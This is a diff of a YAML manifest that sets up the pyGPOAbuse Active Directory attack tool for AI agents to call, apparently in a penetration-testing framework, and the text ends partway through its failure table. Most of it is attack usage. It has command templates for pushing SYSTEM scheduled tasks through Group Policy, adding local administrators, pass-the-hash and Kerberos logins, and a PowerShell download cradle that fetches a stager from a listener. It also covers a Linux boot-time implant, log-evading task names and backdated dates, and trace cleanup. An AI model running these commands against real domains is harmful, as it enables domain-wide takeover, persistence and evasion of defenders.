@@ -1,17 +1,63 @@
 name: pygpoabuse
+kind: cli
+binary: pygpoabuse
 version: "1.0"
-description: "Active Directory GPO exploitation via pyGPOAbuse — create immediate scheduled tasks as SYSTEM, add local administrators, or inject startup scripts through Group Policy Objects. 2 methods: scheduled_task (create GPO-based immediate scheduled task executing as SYSTEM on all domain computers), cleanup (remove task and roll back GPO version). Supports password auth, pass-the-hash, and Kerberos. For finding GPO write access use bloodhound. For other AD attacks use impacket."
-image: "ghcr.io/silicon-works/mcp-tools-pygpoabuse:latest"
+description: >
+  Active Directory GPO exploitation via pyGPOAbuse (Hackndo/pyGPOAbuse). Single
+  Python entry-point invoked through a /usr/local/bin/pygpoabuse wrapper that
+  calls `python3 /opt/pygpoabuse/pygpoabuse.py`. The tool abuses GPO write
+  permissions (GenericAll, GenericWrite, WriteDacl on a GPO container) by
+  injecting an Immediate Scheduled Task into the GPO's machine or user policy
+  segment — the task runs as SYSTEM on every computer the GPO applies to,
+  during the next Group Policy refresh (default ~90 min, can be forced with
+  `gpupdate /force` on the target client).
+
+  Argv form: `pygpoabuse <domain/user[:password]> -gpo-id <GUID|GUID-with-braces>
+  -command "<cmd>" [-dc-ip <IP>] [-hashes :NTHASH] [-k -ccache <path>] [-taskname
+  <NAME>] [-description <DESC>] [-powershell] [-ldaps] [-user|-user-as-admin]
+  [-mod-date <DATE>] [-f] [-v|-vv] [--cleanup]`. The first positional is a
+  CREDENTIAL BLOB in `domain/user:password` form (NOT a DC IP) — pyGPOAbuse
+  parses it via impacket's parse_credentials. The DC is supplied separately via
+  `-dc-ip` (or defaults to the domain itself if -dc-ip is omitted).
+
+  Flag convention is impacket-style: most multi-character long flags use
+  SINGLE dash (`-gpo-id`, `-gpo-name`, `-dc-ip`, `-hashes`, `-taskname`,
+  `-description`, `-mod-date`, `-command`, `-powershell`, `-ldaps`, `-ccache`,
+  `-user`, `-user-as-admin`). Two flags use DOUBLE dash (`--cleanup`, and the
+  Linux-Samba options `--linux-exec` / `--linux-args` / `--linux-run-as`).
+  Short flags are single-dash (`-k`, `-f`, `-v`, `-h`).
+
+  No native structured output — pyGPOAbuse writes plain prose with `[+]`/`[-]`
+  /`[!]` prefixes and `SUCCESS`/`INFO`/`ERROR` log levels. Agents pattern-match
+  the text. The legacy method handlers (scheduled_task, cleanup) auto-inherit
+  run_cli from BaseMCPServer (mcp-common 0.3.0); kind:cli is the new default.
+  The two methods are preserved as the legacy / rollback path with output
+  classification (failure_indicators in mcp-server.py lines 188-194, 247-250).
+
+image: ghcr.io/silicon-works/mcp-tools-pygpoabuse:latest
 image_size_mb: 300
-timeout_seconds: 120
+
+# Dual-clock model — the SMB+LDAP write to SYSVOL is fast (seconds). The
+# subsequent gPCMachineExtensionNames update is also seconds. Total wall time
+# for the Immediate Scheduled Task injection is typically under 30 seconds,
+# but a slow VPN or a domain with thousands of objects can stretch it. idle
+# catches a wedged container; max_runtime is the hard cap.
+idle_timeout_seconds: 300       # 5 min silence == wedged
+max_runtime_seconds: 1800       # 30 min hard cap — covers worst-case slow VPN + large domain
+timeout_seconds: 1800
+idle_timeout: 1800              # legacy field
+allow_multi_target: false       # one DC per call; one GPO per call
 
 capabilities:
   - gpo_exploitation
   - scheduled_task_injection
   - privilege_escalation
+  - persistence
+  - lateral_movement
 
 phases:
   - exploitation
+  - post-exploitation
 
 requirements:
   network: true
@@ -19,101 +65,300 @@ requirements:
 
 resources:
   memory_mb: 256
-  cpu: 0.5
+  cpu: 0.25
 
 routing:
   use_for:
-    - "exploit GPO write access to create scheduled tasks running as SYSTEM"
-    - "escalate privileges via Group Policy Object modification in Active Directory"
-    - "add users to local administrators group via GPO"
-    - "inject startup scripts via GPO for persistence"
-    - "clean up GPO modifications after exploitation"
+    - "Exploit GPO write access (GenericAll / GenericWrite / WriteDacl on a GPO) by injecting an Immediate Scheduled Task that runs as SYSTEM on every computer the GPO applies to"
+    - "Add a local administrator on every computer linked to a GPO (e.g., `net localgroup administrators pwn /add`)"
+    - "Establish persistence via a SYSTEM-level scheduled task pushed through Group Policy"
+    - "Lateral movement from a GPO with WRITE access on Domain Controllers OU to RCE on the DC itself"
+    - "Cleanup — remove a previously-injected scheduled task and roll back the GPO version (`--cleanup`)"
+    - "User-context GPO abuse (`-user`) — inject a scheduled task that runs in the user's session on logon"
+    - "User-as-admin GPO abuse (`-user-as-admin`) — inject a user-targeted task that nonetheless runs as SYSTEM"
+    - "Linux Samba AD GPO abuse — `--linux-exec` injects an executable into SYSVOL and runs it at boot via login.sh"
+    - "Pass-the-hash GPO abuse (`-hashes :NTHASH`) — inject without cleartext password"
+    - "Kerberos GPO abuse (`-k -ccache /path/to/admin.ccache`) — pass-the-ticket via ccache"
   never_use_for:
-    - "finding who has GPO write access (use bloodhound to identify GPO owners)"
-    - "Kerberoasting or AS-REP roasting (use impacket)"
-    - "credential dumping (use impacket secretsdump)"
-    - "general AD enumeration (use bloodhound or netexec)"
+    - "Finding writable GPOs (use bloodhound's GPOWriter / GPOContainsAdmins edges, or bloodyAD `get writable --otype GPO`)"
+    - "Discovering which OUs/computers a GPO applies to (use bloodhound or PowerView Get-GPLink)"
+    - "Generic AD ACL abuse on user/computer/group objects (use bloodyAD — pygpoabuse is GPO-specific)"
+    - "Kerberoasting or AS-REP roasting (use impacket GetUserSPNs / GetNPUsers)"
+    - "Credential dumping (use impacket secretsdump / netexec lsa)"
+    - "Direct command execution on a DC (use impacket psexec/wmiexec/atexec — pygpoabuse goes through GPO refresh, not direct RCE)"
+    - "Lateral movement to a single specific machine (use impacket — pygpoabuse's blast radius is the entire GPO scope)"
+    - "Brute-force or password spray (use kerbrute, netexec — pygpoabuse needs valid creds with GPO write rights)"
+
   triggers:
-    - GPO abuse
-    - Group Policy
-    - pyGPOAbuse
-    - scheduled task GPO
-    - GPO privilege escalation
-    - GenericAll GPO
-    - GenericWrite GPO
+    - "GPO abuse"
+    - "GPO exploitation"
+    - "Group Policy abuse"
+    - "GPO write access"
+    - "GenericAll GPO"
+    - "GenericWrite GPO"
+    - "WriteDacl GPO"
+    - "WriteDACL GPO"
+    - "WriteOwner GPO"
+    - "Immediate Scheduled Task"
+    - "scheduled task GPO"
+    - "schtask GPO"
+    - "pyGPOAbuse"
+    - "pygpoabuse"
+    - "SharpGPOAbuse"
+    - "GPO privilege escalation"
+    - "Group Policy privilege escalation"
+    - "gpupdate force"
+    - "gPCMachineExtensionNames"
+    - "Group Policy refresh"
+    - "Domain Controllers OU GPO"
+    - "Default Domain Policy abuse"
+    - "Default Domain Controllers Policy"
   prefer_over: []
 
 see_also:
   - tool: bloodhound
-    reason: Use bloodhound to identify which users have write access to GPOs (GenericAll, GenericWrite). Then use pygpoabuse to exploit that access.
+    reason: "Use BloodHound to find writable GPOs (GenericAll / GenericWrite / WriteDacl edges on GPO objects, GPOWriter role) and to map which computers each GPO applies to (GPLink, Contains edges from OU to Computer). pygpoabuse exploits the writable GPO — BloodHound finds it. Without BloodHound, you don't know the GPO GUID or the blast radius."
+  - tool: bloodyad
+    reason: "Use bloodyAD `get writable --otype GPO` for an alternate write-discovery path that doesn't need BloodHound's collector. bloodyAD also supports modifying GPO ACLs (`add genericAll`) when you have WriteDacl on a GPO and need to grant yourself write first."
   - tool: impacket
-    reason: Use impacket for other AD attacks (secretsdump, kerberoast, psexec). pygpoabuse specifically exploits GPO write access.
+    reason: "After pygpoabuse injects the scheduled task, use impacket-atexec or impacket-psexec on a target client to FORCE `gpupdate /force` (skip the 90-min refresh wait), then verify the task fired. Also useful for credential dumping (secretsdump) once SYSTEM RCE is achieved."
   - tool: netexec
-    reason: Use netexec to validate credentials and enumerate SMB/LDAP before GPO exploitation.
+    reason: "Use netexec smb / ldap to validate credentials, enumerate SMB shares (SYSVOL access for the GPO modify), and check signing/SMB3 prerequisites before the GPO write. After exploitation, netexec smb -x 'gpupdate /force' to force the refresh remotely."
+  - tool: certipy
+    reason: "Alternative privesc path when GPO write isn't available — certipy ESC1/2/4/8 abuses ADCS templates instead of GPOs. Use one OR the other depending on which write right you have."
 
-methods:
-  scheduled_task:
-    description: "Create an immediate scheduled task via GPO that executes a command as SYSTEM on domain computers. The task runs within minutes when Group Policy refreshes (or force with gpupdate /force on target)."
-    when_to_use: "When bloodhound shows the compromised user has write access (GenericAll, GenericWrite, WriteDACL) to a GPO linked to Domain Controllers or target OUs. Creates a scheduled task that runs the specified command as SYSTEM — use for adding local admins, executing reverse shells, or running post-exploitation commands."
-    params:
-      target:
-        type: string
-        required: true
-        description: "domain/username[:password] format (e.g., 'TEIGNTON/jay.teignton:D0ntL0seSk3l3tonK3y!')."
-      gpo_id:
-        type: string
-        description: "GPO GUID to target (from bloodhound or GPMC)."
-      gpo_name:
-        type: string
-        description: "GPO display name (resolved via LDAP). Provide either gpo_id or gpo_name."
-      command:
-        type: string
-        required: true
-        description: "Command to execute as SYSTEM."
-      dc_ip:
-        type: string
-        description: "Domain controller IP."
-      taskname:
-        type: string
-        description: "Custom task name (default: TASK_<random>)."
-      powershell:
-        type: boolean
-        default: false
-        description: "Use PowerShell for execution."
-      force:
-        type: boolean
-        default: false
-        description: "Force add even if task already exists."
-    returns:
-      gpo:
-        type: string
-        description: "GPO that was modified."
-      command:
-        type: string
-        description: "Command that will execute as SYSTEM."
+# ── kind:cli specific sections ──────────────────────────────────────
 
+target_extraction:
+  # pyGPOAbuse's first positional is a CREDENTIAL BLOB in
+  # `domain/username[:password]` form (impacket parse_credentials), NOT a host.
+  # The DC is supplied separately via `-dc-ip` OR defaults to the domain part
+  # of the credential blob (which means DNS must resolve `<domain>` to the DC).
+  #
+  # Precedence (first match wins):
+  #   1. -dc-ip value     — explicit DC IP/hostname
+  #   2. positional_match — extract the host part from the credential blob
+  #                         after the `@` if present, OR fall back to the
+  #                         domain part (between `/` and `:`)
+  #
+  # We do NOT use `first_non_flag_positional` raw — the first positional is
+  # `corp.local/jdoe:hunter2`, which is a credential, not a target. Using the
+  # raw positional would put a CREDENTIAL into the engagement scope log, which
+  # is a security leak (REQ-SEC-004). Instead, regex out the `<domain>`
+  # subcomponent.
+  - rule: "flag_value"
+    flag: "-dc-ip"
+    parse_as: "raw"
+  - rule: "positional_match"
+    pattern: "^([A-Za-z0-9][A-Za-z0-9.-]*)/[^/:@]+(?::[^@]+)?$"
+    group: 1
+    parse_as: "raw"
+    description: "Extract the <domain> subcomponent from the `domain/user[:password]` first positional. Useful when -dc-ip is omitted and the domain DNS-resolves to the DC."
+
+# pyGPOAbuse has no bulk-target ingest flag (no -tF / --targets-file). It
+# operates on a SINGLE DC and a SINGLE GPO per invocation. The first
+# positional is a credential blob, not a target list. Nothing to reject at
+# the flag layer for scope reasons.
+reject_flags: []
+reject_flags_reason: "pyGPOAbuse has no bulk-target ingest flag. The single positional is a credential blob (domain/user:password), and the DC is one explicit -dc-ip. The GPO target is one -gpo-id (GUID). Single-target tool — one DC + one GPO + one task per call. Multi-DC / multi-GPO is achieved by repeated calls."
+
+# Per-tool value-taking flags whose values must NOT be confused with positional
+# targets. pyGPOAbuse uses MIXED dash convention but skewed heavily toward
+# SINGLE-DASH long-form (impacket convention): -gpo-id, -gpo-name, -dc-ip,
+# -hashes, -taskname, -mod-date, -description, -command, -ccache, -powershell,
+# -ldaps, -user, -user-as-admin, -f, -k, -v. Two long flags use DOUBLE-DASH:
+# --cleanup (boolean) and the Linux-Samba options --linux-exec / --linux-args
+# / --linux-run-as. Verified against upstream cli.py argparse declarations.
+value_flags:
+  # ── Authentication & DC targeting ──
+  - "-dc-ip"               # DC IP or hostname (NOT --dc-ip — single dash)
+  - "-hashes"              # NTLM hash pair `LMHASH:NTHASH` or `:NTHASH`
+  - "-ccache"              # Path to Kerberos ccache file (used WITH -k)
+  - "-k"                   # Kerberos boolean — listed for safety (NEVER takes value)
+  - "-ldaps"               # Boolean — listed for safety
+  # ── GPO targeting (mutually exclusive — one is REQUIRED) ──
+  - "-gpo-id"              # GPO GUID (with or without curly braces, see gotchas)
+  - "-gpo-name"            # GPO display name (resolved via LDAP)
+  # ── Task content ──
+  - "-command"             # Command to execute as SYSTEM (single string)
+  - "-taskname"            # Custom task name (default TASK_<random>)
+  - "-description"         # Task description (default empty)
+  - "-mod-date"            # Task modification date (default 30 days ago)
+  - "-powershell"          # Boolean — listed for safety
+  - "-user"                # Boolean — user GPO (default: computer GPO)
+  - "-user-as-admin"       # Boolean — user GPO running as SYSTEM
+  - "-f"                   # Boolean — force add even if task exists
+  - "-v"                   # Verbosity count (-v / -vv) — listed for safety
+  # ── Cleanup ──
+  - "--cleanup"            # Boolean — only flag with double-dash convention
+  # ── Linux Samba AD options ──
+  - "--linux-exec"         # Local executable to upload + run at Linux client boot
+  - "--linux-args"         # Args for the linux executable
+  - "--linux-run-as"       # User to run the linux executable as (default root)
+
+usage_patterns:
+  - name: "Standard GPO abuse — drop a scheduled task that runs whoami as SYSTEM"
+    command: "pygpoabuse '{domain}/{username}:{password}' -dc-ip {dc_ip} -gpo-id '{gpo_guid}' -command 'cmd /c whoami > C:\\Windows\\Temp\\opensploit-proof.txt'"
+    when: "Smoke-test the GPO write path with a benign payload. After Group Policy refresh on a target client (or `gpupdate /force` via impacket-atexec), verify the file exists. The credential blob is the FIRST positional — note the `domain/user:password` impacket form. -dc-ip overrides the default (which would resolve `domain` via DNS). -gpo-id is the GPO GUID — get it from BloodHound's `(g:GPO {name:'<NAME>'}) RETURN g.objectid` or bloodyAD `get search --filter '(objectClass=groupPolicyContainer)'`."
+
+  - name: "Pass-the-hash GPO abuse"
+    command: "pygpoabuse '{domain}/{username}' -hashes ':{nt_hash}' -dc-ip {dc_ip} -gpo-id '{gpo_guid}' -command 'net localgroup administrators {pwn_user} /add'"
+    when: "When you have an NT hash via responder/secretsdump but no cleartext. Form: `-hashes :NTHASH` with leading colon for the empty LM half. The credential blob has NO password (no `:` after the user) — pyGPOAbuse pulls the hash from -hashes. Payload `net localgroup administrators` requires the GPO to apply to a Windows client (computer GPO, not user)."
+
+  - name: "Kerberos pass-the-ticket GPO abuse"
+    command: "pygpoabuse '{domain}/{username}' -k -ccache /session/credentials/{user}.ccache -dc-ip {dc_ip} -gpo-id '{gpo_guid}' -command 'powershell.exe -enc {b64_payload}' -powershell"
+    when: "When NTLM is disabled domain-wide or you only have a TGT. -k is BARE BOOLEAN; `-ccache /path/to/file.ccache` supplies the ticket cache (REQUIRED with -k — pyGPOAbuse argparse rejects -k without -ccache). The credential blob has neither password nor hash. -powershell wraps the command in `powershell.exe -enc` automatically."
+
+  - name: "Custom task name and description (operational stealth)"
+    command: "pygpoabuse '{domain}/{username}:{password}' -dc-ip {dc_ip} -gpo-id '{gpo_guid}' -command '{cmd}' -taskname 'Microsoft-Windows-DefaultUpdate' -description 'Windows Update Maintenance Task'"
+    when: "Default task name is `TASK_<random>` which is suspicious in event logs. Pin a benign-looking taskname and a believable description for stealth. NB: there is NO `-author` flag (the task spec mentioned it but upstream doesn't have it — author defaults to NT AUTHORITY\\SYSTEM). NO `-execution-time` flag either — task runs immediately on next GP refresh."
+
+  - name: "PowerShell payload via -command + -powershell"
+    command: "pygpoabuse '{domain}/{username}:{password}' -dc-ip {dc_ip} -gpo-id '{gpo_guid}' -powershell -command \"IEX (New-Object Net.WebClient).DownloadString('http://{listener}/{stager}.ps1')\""
+    when: "When the payload is PowerShell. -powershell tells pyGPOAbuse to wrap the -command value in `powershell.exe -nop -w hidden -c \"<cmd>\"`. There is NO `-powershell <PS-FILE>` form — the PS code goes inline via -command. To run a remote .ps1, use the IEX downloader idiom inside -command. NB: the spec mentioned `-powershell <PS-FILE>` — that is INCORRECT for upstream pyGPOAbuse, where -powershell is a BARE BOOLEAN."
+
+  - name: "User-context GPO (logon-time task)"
+    command: "pygpoabuse '{domain}/{username}:{password}' -dc-ip {dc_ip} -gpo-id '{gpo_guid}' -user -command '{cmd}'"
+    when: "Default GPO mode is COMPUTER (task runs at boot/refresh as SYSTEM). -user switches to user-context (task runs at user logon as the user). Use when the GPO links to a User OU rather than Computer OU. -user-as-admin is a hybrid: user-targeted but runs as SYSTEM (impacket-style trick)."
+
+  - name: "Cleanup — roll back the scheduled task and GPO version"
+    command: "pygpoabuse '{domain}/{username}:{password}' -dc-ip {dc_ip} -gpo-id '{gpo_guid}' --cleanup"
+    when: "After exploitation is complete. --cleanup is one of only two double-dash flags in pyGPOAbuse. Removes the Immediate Scheduled Task XML from SYSVOL and rolls the GPO version number back. CAUTION: cleanup is NOT atomic — if the task already fired on some clients, the local Scheduled Tasks artefacts on those clients remain and need separate per-client cleanup."
+
+  - name: "GPO targeting by display name (resolves via LDAP)"
+    command: "pygpoabuse '{domain}/{username}:{password}' -dc-ip {dc_ip} -gpo-name '{gpo_display_name}' -command '{cmd}'"
+    when: "When you know the GPO display name (e.g., 'Default Domain Controllers Policy', 'Workstation Hardening') but don't have the GUID handy. -gpo-name is mutually exclusive with -gpo-id — pyGPOAbuse argparse rejects both at once. The display-name → GUID resolution does an LDAP search; if the name has spaces or special chars, single-quote the value."
+
+  - name: "Verbose mode for debugging GPO write failures"
+    command: "pygpoabuse '{domain}/{username}:{password}' -dc-ip {dc_ip} -gpo-id '{gpo_guid}' -command '{cmd}' -vv"
+    when: "When the default output is too terse (e.g., 'Error while updating versions' with no detail). -v is INFO, -vv is DEBUG. Verbose mode dumps SMB/LDAP traffic and impacket exception traces — essential for diagnosing why a GPO write rejected (signing required, AdminSDHolder reset, etc.)."
+
+  - name: "Linux Samba AD — upload an executable for boot-time execution"
+    command: "pygpoabuse '{domain}/{username}:{password}' -dc-ip {dc_ip} -gpo-id '{gpo_guid}' --linux-exec /session/payloads/implant --linux-args '--port 4444' --linux-run-as root"
+    when: "Samba AD environments treat GPOs differently — pyGPOAbuse has dedicated --linux-exec / --linux-args / --linux-run-as flags that drop a binary into SYSVOL and add a login.sh hook. NOT for Windows AD. The local executable (--linux-exec value) must be readable inside the container; pin under /session/."
+
+output_formats:
+  # pyGPOAbuse has NO native JSON / XML output flag — it writes plain prose
+  # via Python's logging module with `[+]` (success), `[-]` (info), and `[!]`
+  # (warning/error) prefixes. Custom log levels: SUCCESS (custom 25), INFO,
+  # ERROR. Agents pattern-match the text. The legacy method handlers in
+  # mcp-server.py (lines 188-194, 247-250) inspect output for failure
+  # indicators — that classification is NOT reconstructible from raw stdout
+  # via run_cli; agents that want classified errors call `mcp_tool pygpoabuse
+  # scheduled_task ...` rather than `cli_in_container pygpoabuse ...`.
+  - flag: ""               # default — text-only stdout
+    format: "text"
+    preferred: true
+    notes: "Plain prose with `[+]` (success), `[-]` (info), and `[!]` (error/warning) prefixes via Python logging. The custom log level SUCCESS prints `[+] SUCCESS:root:ScheduledTask <name> created!` on success. Agents pattern-match against the failure_signatures table for error classification."
+
+common_options:
+  targeting:
+    - "FIRST POSITIONAL: credential blob `domain/user[:password]` (impacket parse_credentials). NOT a hostname. Examples: `corp.local/jdoe:hunter2` (with password), `corp.local/jdoe` (password prompted or supplied via -hashes / -k)."
+    - "-dc-ip IP|FQDN: Domain Controller hostname or IP. If omitted, pyGPOAbuse uses the domain part of the credential blob and relies on DNS to resolve `<domain>` to a DC. Always pass -dc-ip explicitly when DNS is unreliable inside the container."
+  authentication:
+    - "Cleartext password: append `:password` to the credential blob (`corp.local/jdoe:hunter2`). The colon is the separator."
+    - "-hashes LMHASH:NTHASH | :NTHASH: NTLM hash auth. Bare `:NTHASH` (with leading colon for empty LM) is the canonical form."
+    - "-k: BARE BOOLEAN — Kerberos auth. Pair with `-ccache /path/to/file.ccache` (REQUIRED — pyGPOAbuse argparse exits 1 if -k without -ccache). The KRB5CCNAME env var is NOT consulted by pyGPOAbuse (unlike bloodyAD); use -ccache explicitly."
+    - "-ldaps: switch to LDAPS for the LDAP bind. Required on hardened domains where LDAP-signing is mandatory."
+  gpo:
+    - "-gpo-id GUID: GPO GUID. Curly-brace form (`{31B2F340-016D-11D2-945F-00C04FB984F9}`) and bare GUID (`31B2F340-016D-11D2-945F-00C04FB984F9`) both work. Mutually exclusive with -gpo-name."
+    - "-gpo-name 'DISPLAY NAME': resolve GPO by display name via LDAP (e.g., 'Default Domain Controllers Policy'). Mutually exclusive with -gpo-id. Spaces in name → quote."
+  payload:
+    - "-command 'CMD': command to execute as SYSTEM (or as the user with -user). Single string. The task XML wraps it as a TaskExecutable + Argument."
+    - "-powershell: BOOLEAN — wrap the -command value in `powershell.exe -nop -w hidden -c ...` automatically."
+    - "-taskname 'NAME': custom task name. Default `TASK_<random>`."
+    - "-description 'DESC': task description. Default empty."
+    - "-mod-date 'YYYY-MM-DDTHH:MM:SS': task modification date for stealth. Default 30 days ago."
+    - "-user: BOOLEAN — user GPO (logon-time task as the user). Default mode is computer GPO."
+    - "-user-as-admin: BOOLEAN — user GPO running as SYSTEM (hybrid)."
+    - "-f: BOOLEAN — force add the task even if one with the same name exists."
   cleanup:
-    description: "Remove a previously created scheduled task and roll back the GPO version to cover tracks."
-    when_to_use: "After exploitation is complete — remove the malicious GPO entry and restore the original GPO version number."
-    params:
-      target:
-        type: string
-        required: true
-        description: "domain/username[:password] format."
-      gpo_id:
-        type: string
-        description: "GPO GUID."
-      gpo_name:
-        type: string
-        description: "GPO display name."
-      taskname:
-        type: string
-        required: true
-        description: "Name of the task to remove."
-      dc_ip:
-        type: string
-        description: "Domain controller IP."
-    returns:
-      cleaned_up:
-        type: boolean
-        description: "Whether cleanup succeeded."
+    - "--cleanup: BOOLEAN (DOUBLE DASH — anomaly) — remove the Immediate Scheduled Task XML and roll the GPO version back. Pair with -gpo-id, -taskname (the name used during creation), and the same auth flags."
+  linux_samba_ad:
+    - "--linux-exec PATH: BOUNDARY local executable to upload to SYSVOL and run at Linux client boot. NOT for Windows AD."
+    - "--linux-args 'ARGS': args for the Linux executable."
+    - "--linux-run-as USER: user to run the Linux executable as (default root)."
+
+gotchas:
+  - "FIRST POSITIONAL IS A CREDENTIAL BLOB, NOT A HOST. Form: `domain/user[:password]` (impacket parse_credentials). Examples: `corp.local/jdoe:hunter2`, `corp.local/jdoe` (no password — supply via -hashes or -k -ccache). Do NOT pass an IP as the first positional — pyGPOAbuse will parse it as `domain=`, `user=<IP>`, `password=` and fail at SMB login. The DC IP goes via -dc-ip."
+  - "BINARY NAME IS LOWERCASE: `pygpoabuse` (NOT pyGPOAbuse, NOT pyGPOAbuse.py). The image installs a `/usr/local/bin/pygpoabuse` shell wrapper that does `exec python3 /opt/pygpoabuse/pygpoabuse.py \"$@\"`. The Python file itself is at /opt/pygpoabuse/pygpoabuse.py. SKILL #5 — match vendor reality. The CamelCase repo name (Hackndo/pyGPOAbuse) does NOT carry through to the binary."
+  - "DASH CONVENTION IS IMPACKET-STYLE — most multi-character LONG flags use SINGLE dash: `-gpo-id`, `-gpo-name`, `-dc-ip`, `-hashes`, `-taskname`, `-description`, `-mod-date`, `-command`, `-ccache`, `-powershell`, `-ldaps`, `-user`, `-user-as-admin`. Short flags also single-dash (`-k`, `-f`, `-v`, `-h`). EXCEPTIONS: `--cleanup`, `--linux-exec`, `--linux-args`, `--linux-run-as` (DOUBLE dash). DO NOT use `--gpo-id` or `--dc-ip` — argparse rejects them as `unrecognized arguments`."
+  - "GPO ID FORMAT — both curly-brace `{31B2F340-016D-11D2-945F-00C04FB984F9}` and bare `31B2F340-016D-11D2-945F-00C04FB984F9` are accepted (pyGPOAbuse strips the braces internally). Get the GUID from BloodHound (`MATCH (g:GPO) RETURN g.name, g.objectid`), bloodyAD (`get search --filter '(objectClass=groupPolicyContainer)' --attr name,displayName`), or PowerView (`Get-GPO`)."
+  - "SPEC FLAGS THAT DON'T EXIST (caller hallucinations): `-author`, `-execution-time`, and `-powershell <PS-FILE>` were mentioned in the migration spec but are NOT in upstream pyGPOAbuse. The task author defaults to NT AUTHORITY\\SYSTEM (no override flag). The execution time is implicitly 'immediate at next GP refresh' (no override flag). The -powershell flag is a BARE BOOLEAN — not a path argument; the PS code goes via -command as a single string."
+  - "BLAST RADIUS WARNING — the injected scheduled task runs on EVERY computer the GPO applies to, NOT just on the DC or a specific machine. The Default Domain Policy applies to every computer in the domain (millions of endpoints in enterprise). Verify GPO scope via BloodHound's GPLink edges or PowerView Get-GPLink BEFORE pushing the task. For DC-only impact, target the 'Default Domain Controllers Policy' or a GPO linked to the Domain Controllers OU."
+  - "GROUP POLICY REFRESH TIMING — the injected task does NOT run instantly. Default refresh is 90-120 minutes (random offset). For an immediate fire, use impacket-atexec / impacket-psexec / netexec smb to run `gpupdate /force` on a target client AFTER the GPO write succeeds. Without the forced refresh, expect ~90 min wait."
+  - "CLEANUP IS NOT ATOMIC — `--cleanup` removes the Immediate Scheduled Task XML from SYSVOL and rolls the GPO version back. BUT: if the task already fired on some clients during the gap between push and cleanup, the local Scheduled Tasks on those clients remain (Task Scheduler library entries). Cleanup those per-client via schtasks /delete or impacket-atexec for full-trace removal."
+  - "PASS-THE-HASH FORMAT — `-hashes :NTHASH` with LEADING COLON for the empty LM half. Bare `NTHASH` without colon → pyGPOAbuse 'Wrong hash format. Expecting lm:nt' and exits 1. Full `LMHASH:NTHASH` also works."
+  - "KERBEROS REQUIRES -ccache — `-k` is a bare boolean, but pyGPOAbuse's argparse logic exits 1 if `-k` is set without `-ccache /path/to/file.ccache`. The KRB5CCNAME env var is NOT consulted (unlike bloodyAD's auto-discovery). Always pair: `-k -ccache /session/credentials/<user>.ccache`."
+  - "CCACHE PATH MUST BE READABLE — pyGPOAbuse passes the ccache path through impacket's URL builder. The path must be ABSOLUTE and the file must exist + be readable inside the container. Pin under /session/credentials/ for persistence across container restarts."
+  - "DOMAIN PART IS REQUIRED — if the credential blob has no `/` (e.g., bare `jdoe:hunter2`), pyGPOAbuse exits with `Domain should be specified!`. Always supply `domain/user...`."
+  - "GPO-ID OR GPO-NAME IS MUTUALLY EXCLUSIVE BUT REQUIRED — pyGPOAbuse argparse uses an `add_mutually_exclusive_group(required=True)` for -gpo-id / -gpo-name. Missing both → `argparse: one of the arguments -gpo-id -gpo-name is required`. Both at once → `argparse: not allowed with argument`."
+  - "NO STRUCTURED OUTPUT — pyGPOAbuse writes plain prose via Python logging with `[+]`/`[-]`/`[!]` prefixes. Success marker is `SUCCESS:root:ScheduledTask <name> created!` (custom log level 25). Errors are `[!] ...` or Python tracebacks. No --json / -o / --output flag exists."
+  - "EXIT CODE INCONSISTENCY — pyGPOAbuse may exit 0 even when the GPO write fails (e.g., `Error while updating versions` returns 1, but `An error occurred. Use -vv for more details` may return 0 on the exception path). Pattern-match the failure_signatures table — don't trust exit code alone."
+  - "SYSVOL WRITE PERMISSION — pyGPOAbuse writes the Immediate Scheduled Task XML directly to `\\\\<DC>\\SYSVOL\\<domain>\\Policies\\{<GPO-GUID>}\\<Machine|User>\\Preferences\\ScheduledTasks\\ScheduledTasks.xml`. Requires SMB write access on SYSVOL — most authenticated users have READ but only members of the GPO's owners or Domain Admins (or trustees with explicit ACE) have WRITE. The LDAP-side rights check (GenericAll/GenericWrite on the GPO container) does NOT guarantee SYSVOL write — they're separate ACLs. Common failure: LDAP succeeds, SYSVOL write fails with STATUS_ACCESS_DENIED."
+  - "Feature 28 dynamic recipes are RETIRED for the kind:cli path — the LLM writes argv directly. Recipes still load for legacy method calls (scheduled_task, cleanup) if /session/tool_recipes/pygpoabuse/ exists, but they're a dead branch under run_cli (REQ-TR-016)."
+  - "SHORT-DASH COLLISIONS — `-f` is FORCE (not format), `-v` is verbosity count (NOT version — there's no version flag in pyGPOAbuse), `-k` is Kerberos (not key). Different from impacket's GetUserSPNs / smbclient where -k may take a value or `-f` is hash-format."
+  - "SAMBA AD VS WINDOWS AD — the `--linux-exec` family is for Samba AD on Linux clients only. Do NOT use for Windows AD — the login.sh hook is a Linux artefact. Windows AD uses `-command` + scheduled task injection."
+  - "LEGACY METHOD TIMEOUTS DIVERGE FROM CLI DEFAULTS — the legacy `scheduled_task` handler caps `run_command(..., timeout=60)` (mcp-server.py:183) and `cleanup` caps at `timeout=30` (mcp-server.py:241). Under kind:cli the wrapper inherits `max_runtime_seconds: 1800` / `idle_timeout_seconds: 300` from this file — much more permissive. Net effect: a slow GPO write that the legacy method would TimeoutError at 60 s succeeds quietly under cli_in_container. If agents need the legacy fast-fail behaviour (e.g. probing for SMB/LDAP wedge), they MUST call `mcp_tool pygpoabuse scheduled_task` instead of the cli path, or pass an explicit `timeout` override on the cli call."
+
+failure_signatures:
+  # Layer-diverse signals (SKILL #11) — at least 6 distinct verifiable layers:
+  #   1. DNS  2. TCP  3. SMB bind / NTLM auth  4. SMB write (SYSVOL access)
+  #   5. LDAP / GPO modify  6. Kerberos  7. Argparse  8. pyGPOAbuse-specific
+  - signal: "Could not resolve"
+    remediation: "DNS resolution failed for the DC. Verify -dc-ip (try IP literal). pyGPOAbuse uses the domain part of the credential blob as the DC if -dc-ip is omitted — set -dc-ip explicitly when the container's DNS doesn't resolve the domain to a DC."
+  - signal: "Name or service not known"
+    remediation: "DNS unreachable — same root as 'Could not resolve'. Always pass `-dc-ip <IP>` explicitly when DNS is unreliable inside the container."
+  - signal: "Connection refused"
+    remediation: "TCP connection refused on SMB (445) or LDAP (389/636). The DC is reachable but the service is filtered. Verify with nmap -p 389,445,636. Check VPN routing; try -ldaps if 389 is blocked but 636 is open."
+  - signal: "connection error"
+    remediation: "Generic socket error — usually TCP refused, reset, or timed out. Read prior log lines for the specific cause. Verify DC reachability with curl/nmap before re-running."
+  - signal: "STATUS_LOGON_FAILURE"
+    remediation: "SMB login failed — wrong password / hash / domain. Verify the credential blob format `domain/user:password` (impacket form). For PtH, format MUST be `:NTHASH` (leading colon for empty LM half). Check that the username is sAMAccountName, not UPN."
+  - signal: "STATUS_ACCESS_DENIED"
